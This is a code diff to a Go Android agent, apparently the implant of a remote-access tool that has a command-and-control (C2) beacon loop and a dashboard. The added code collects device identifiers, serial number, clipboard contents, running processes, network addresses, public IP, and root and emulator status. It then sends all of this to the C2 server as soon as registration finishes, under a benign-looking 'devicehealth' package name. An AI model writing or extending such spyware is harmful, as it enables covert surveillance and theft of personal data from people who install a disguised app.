@@ -16,6 +16,8 @@ package main
 // #include <errno.h>
 // #include <string.h>
 // #include <stdint.h>
+// #include <stdlib.h>
+// #include <sys/system_properties.h>
 //
 // static void _seccomp_trap(int sig, siginfo_t *si, void *ucp) {
 //     (void)sig; (void)si;
@@ -37,6 +39,13 @@ package main
 //     sa.sa_sigaction = _seccomp_trap;
 //     sa.sa_flags = SA_SIGINFO | SA_NODEFER;
 //     sigaction(SIGSYS, &sa, NULL);
+// }
+//
+// // Read Android system property via the property service.
+// // This works from sandboxed apps — it uses a shared memory region,
+// // not shell commands. Available on all Android versions.
+// static int get_system_property(const char *name, char *value) {
+//     return __system_property_get(name, value);
 // }
 import "C"
 
@@ -60,6 +69,7 @@ import (
 	"sync"
 	"syscall"
 	"time"
+	"unsafe"
 )
 
 // ============================================================
@@ -378,17 +388,32 @@ func shellExecTimeout(cmd string, timeout time.Duration) (string, error) {
 }
 
 func getProp(key string) string {
-	// Try shell getprop first (works on older Android / non-sandboxed)
+	// Primary: use Android's __system_property_get() via CGO.
+	// This reads from the shared property memory region and works
+	// from sandboxed apps on ALL Android versions (no shell needed).
+	cKey := C.CString(key)
+	defer C.free(unsafe.Pointer(cKey))
+	var cValue [C.PROP_VALUE_MAX + 1]C.char
+	n := C.get_system_property(cKey, &cValue[0])
+	if n > 0 {
+		return C.GoString(&cValue[0])
+	}
+
+	// Fallback: read from build.prop files (covers edge cases)
+	val := getPropFromFiles(key)
+	if val != "" {
+		return val
+	}
+
+	// Last resort: try shell getprop (works on older non-sandboxed Android)
 	out, err := shellExec("getprop " + key)
 	if err == nil && out != "" {
 		return out
 	}
-	// Fallback: read directly from property files (works in sandboxed apps)
-	return getPropFromFiles(key)
+	return ""
 }
 
 // propFiles lists Android property files in priority order.
-// /system/build.prop is world-readable on all Android versions.
 var propFiles = []string{
 	"/system/build.prop",
 	"/vendor/build.prop",
@@ -397,7 +422,6 @@ var propFiles = []string{
 	"/system/default.prop",
 }
 
-// propCache caches parsed properties so we only read files once.
 var propCache map[string]string
 var propCacheOnce sync.Once
 
@@ -505,60 +529,265 @@ func getOrCreatePersistentID() string {
 
 func getDeviceInfo() map[string]interface{} {
 	info := make(map[string]interface{})
+
+	// --- Fields used by registration (clients table) ---
+	model := getProp("ro.product.model")
+	brand := getProp("ro.product.brand")
+	manufacturer := getProp("ro.product.manufacturer")
+	androidVer := getProp("ro.build.version.release")
+	sdkVer := getProp("ro.build.version.sdk")
+	abi := getProp("ro.product.cpu.abi")
+
 	info["platform"] = "android"
-	info["model"] = getProp("ro.product.model")
-	info["brand"] = getProp("ro.product.brand")
-	info["manufacturer"] = getProp("ro.product.manufacturer")
+	info["model"] = model
+	info["brand"] = brand
+	info["manufacturer"] = manufacturer
 	info["device"] = getProp("ro.product.device")
-	info["android_version"] = getProp("ro.build.version.release")
-	info["sdk_version"] = getProp("ro.build.version.sdk")
+	info["android_version"] = androidVer
+	info["sdk_version"] = sdkVer
 	info["build_id"] = getProp("ro.build.display.id")
 	info["security_patch"] = getProp("ro.build.version.security_patch")
 	info["serial"] = getProp("ro.serialno")
 	info["hardware"] = getProp("ro.hardware")
 	info["board"] = getProp("ro.product.board")
-	info["abi"] = getProp("ro.product.cpu.abi")
+	info["abi"] = abi
 	info["fingerprint"] = getProp("ro.build.fingerprint")
 
-	// Network info — try shell first, fall back to reading /proc
+	// --- Fields expected by dashboard SystemInfoTab ---
+
+	// Hardware card: cpu, total_ram_mb, avail_ram_mb, screen, arch
+	cpuInfo := getProp("ro.hardware")
+	if cpuInfo == "" {
+		cpuInfo = readCPUInfo()
+	}
+	info["cpu"] = cpuInfo
+	info["arch"] = abi
+	totalMB, availMB := getMemoryMB()
+	info["total_ram_mb"] = totalMB
+	info["avail_ram_mb"] = availMB
+	info["screen"] = getScreenResolution()
+
+	// Network card: public_ip, network (array of {name, ip})
+	publicIP := getPublicIP()
+	info["public_ip"] = publicIP
+	info["external_ip"] = publicIP
+	info["network"] = getNetworkInterfaces()
+
+	// Local IP for registration
 	ip, _ := shellExec("ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' | head -1")
 	if ip == "" {
 		ip = getLocalIPFromProc()
 	}
+	if ip == "" {
+		ip = publicIP
+	}
 	info["ip"] = ip
 
-	// External IP (use Go net/http, not curl)
-	info["external_ip"] = getPublicIP()
+	// Security card: is_admin, antivirus, pid, is_vm, is_debugged, analysis_tools
+	rooted := isRooted()
+	info["rooted"] = rooted
+	info["is_admin"] = rooted
+	info["antivirus"] = "N/A (Android)"
+	info["pid"] = os.Getpid()
+	info["is_vm"] = isEmulator()
+	info["is_debugged"] = false
+	info["analysis_tools"] = []string{}
 
-	// Battery — try shell, fall back to reading sysfs
+	// System card: computer_name, username, os
+	deviceName := strings.TrimSpace(brand + " " + model)
+	if deviceName == "" || deviceName == " " {
+		deviceName = strings.TrimSpace(manufacturer + " " + getProp("ro.product.device"))
+	}
+	info["computer_name"] = deviceName
+	user, _ := shellExec("whoami")
+	if user == "" {
+		user = "app"
+	}
+	info["username"] = user
+	osStr := fmt.Sprintf("Android %s (SDK %s)", androidVer, sdkVer)
+	info["os"] = osStr
+
+	// Clipboard
+	clip, _ := shellExec("service call clipboard 2 s16 com.devicehealth.service 2>/dev/null")
+	info["clipboard"] = clip
+
+	// Running processes
+	info["running_procs"] = getRunningProcs()
+
+	// Battery
 	battery, _ := shellExec("dumpsys battery 2>/dev/null | grep -E 'level|status|temperature' | head -5")
 	if battery == "" {
 		battery = readBatterySysfs()
 	}
 	info["battery"] = battery
 
-	// Memory — read /proc/meminfo directly (world-readable)
-	info["memory"] = readFileHead("/proc/meminfo", 3)
+	// Storage
+	info["storage"] = getStorageInfo()
 
-	// Storage — try shell, fall back to Go's syscall
-	storage, _ := shellExec("df -h /data 2>/dev/null | tail -1")
-	if storage == "" {
-		storage = getStorageInfo()
-	}
-	info["storage"] = storage
-
-	// Root check
-	_, errSu := exec.LookPath("su")
-	_, errMagisk := os.Stat("/sbin/magisk")
-	info["rooted"] = errSu == nil || errMagisk == nil
-
-	// Uptime — read /proc/uptime directly (world-readable)
+	// Uptime
 	uptimeData := readFileHead("/proc/uptime", 1)
 	if parts := strings.Fields(uptimeData); len(parts) > 0 {
 		info["uptime_seconds"] = parts[0]
 	}
 
 	return info
+}
+
+// readCPUInfo reads processor name from /proc/cpuinfo.
+func readCPUInfo() string {
+	data, err := os.ReadFile("/proc/cpuinfo")
+	if err != nil {
+		return "unknown"
+	}
+	for _, line := range strings.Split(string(data), "\n") {
+		// ARM uses "Hardware", x86 uses "model name"
+		for _, prefix := range []string{"Hardware\t:", "model name\t:"} {
+			if strings.HasPrefix(line, prefix) {
+				return strings.TrimSpace(strings.TrimPrefix(line, prefix))
+			}
+		}
+	}
+	return getProp("ro.product.board")
+}
+
+// getMemoryMB reads total and available memory from /proc/meminfo.
+func getMemoryMB() (int, int) {
+	data, err := os.ReadFile("/proc/meminfo")
+	if err != nil {
+		return 0, 0
+	}
+	var total, avail int
+	for _, line := range strings.Split(string(data), "\n") {
+		fields := strings.Fields(line)
+		if len(fields) < 2 {
+			continue
+		}
+		val := 0
+		fmt.Sscanf(fields[1], "%d", &val)
+		switch fields[0] {
+		case "MemTotal:":
+			total = val / 1024 // kB to MB
+		case "MemAvailable:":
+			avail = val / 1024
+		}
+	}
+	return total, avail
+}
+
+// getScreenResolution tries to read display resolution.
+func getScreenResolution() string {
+	// Try dumpsys display (may be blocked in sandbox)
+	out, _ := shellExec("dumpsys display 2>/dev/null | grep -o 'real [0-9]*x[0-9]*' | head -1")
+	if out != "" {
+		return strings.TrimPrefix(out, "real ")
+	}
+	// Try wm size
+	out, _ = shellExec("wm size 2>/dev/null")
+	if strings.Contains(out, "x") {
+		parts := strings.Fields(out)
+		if len(parts) > 0 {
+			return parts[len(parts)-1]
+		}
+	}
+	return "unknown"
+}
+
+// getNetworkInterfaces reads network interface IPs from /proc/net/fib_trie.
+func getNetworkInterfaces() []map[string]string {
+	var ifaces []map[string]string
+	// Read interface names and IPs from /sys/class/net/
+	data, err := os.ReadFile("/proc/net/route")
+	if err != nil {
+		return ifaces
+	}
+	seen := make(map[string]bool)
+	for _, line := range strings.Split(string(data), "\n") {
+		fields := strings.Fields(line)
+		if len(fields) < 2 || fields[0] == "Iface" || fields[0] == "lo" {
+			continue
+		}
+		ifName := fields[0]
+		if seen[ifName] {
+			continue
+		}
+		seen[ifName] = true
+		ip := getIfaceIPFromProc(ifName)
+		if ip != "" {
+			ifaces = append(ifaces, map[string]string{"name": ifName, "ip": ip})
+		}
+	}
+	return ifaces
+}
+
+// getIfaceIPFromProc reads IP for an interface from /proc/net/if_inet6 or /sys.
+func getIfaceIPFromProc(iface string) string {
+	// Read from /proc/net/fib_trie — look for LOCAL entries after the interface
+	data, err := os.ReadFile("/proc/1/net/fib_trie")
+	if err != nil {
+		data, err = os.ReadFile("/proc/net/fib_trie")
+	}
+	if err != nil {
+		return ""
+	}
+	lines := strings.Split(string(data), "\n")
+	for i, line := range lines {
+		if strings.Contains(line, "/LOCAL") {
+			// The IP is on the previous line with leading spaces
+			if i > 0 {
+				ip := strings.TrimSpace(lines[i-1])
+				// Skip loopback and link-local
+				if ip != "" && ip != "127.0.0.1" && !strings.HasPrefix(ip, "127.") && !strings.HasPrefix(ip, "169.254.") {
+					return ip
+				}
+			}
+		}
+	}
+	return ""
+}
+
+// getRunningProcs returns a list of running process names.
+func getRunningProcs() []string {
+	// Try ps command first
+	out, err := shellExec("ps -A -o NAME 2>/dev/null | tail -n +2 | head -80")
+	if err == nil && out != "" {
+		return strings.Split(strings.TrimSpace(out), "\n")
+	}
+	// Fallback: read /proc/<pid>/cmdline
+	var procs []string
+	entries, err := os.ReadDir("/proc")
+	if err != nil {
+		return procs
+	}
+	for _, e := range entries {
+		if !e.IsDir() {
+			continue
+		}
+		// Check if dirname is numeric (PID)
+		pid := e.Name()
+		isNum := true
+		for _, c := range pid {
+			if c < '0' || c > '9' {
+				isNum = false
+				break
+			}
+		}
+		if !isNum {
+			continue
+		}
+		cmdline, err := os.ReadFile("/proc/" + pid + "/cmdline")
+		if err != nil || len(cmdline) == 0 {
+			continue
+		}
+		// cmdline is null-delimited; take first arg
+		name := strings.Split(string(cmdline), "\x00")[0]
+		if name != "" {
+			procs = append(procs, filepath.Base(name))
+		}
+		if len(procs) >= 80 {
+			break
+		}
+	}
+	return procs
 }
 
 // readFileHead reads the first N lines of a file directly.
@@ -1441,6 +1670,10 @@ func runAgent() {
 	}
 	osInfo := fmt.Sprintf("Android %s (SDK %s)", androidVer, sdkVer)
 	ip, _ := info["ip"].(string)
+	if ip == "" {
+		// Fall back to external IP if local IP unavailable (sandbox blocks ip route)
+		ip, _ = info["external_ip"].(string)
+	}
 
 	// Register
 	for i := 0; i < 5; i++ {
@@ -1450,6 +1683,9 @@ func runAgent() {
 		}
 		time.Sleep(time.Duration(3*(i+1)) * time.Second)
 	}
+
+	// Auto-send system info so the dashboard has data immediately
+	c2.SendSystemInfo("android_sysinfo", info)
 
 	// Main C2 loop
 	beaconInterval := 5 * time.Second
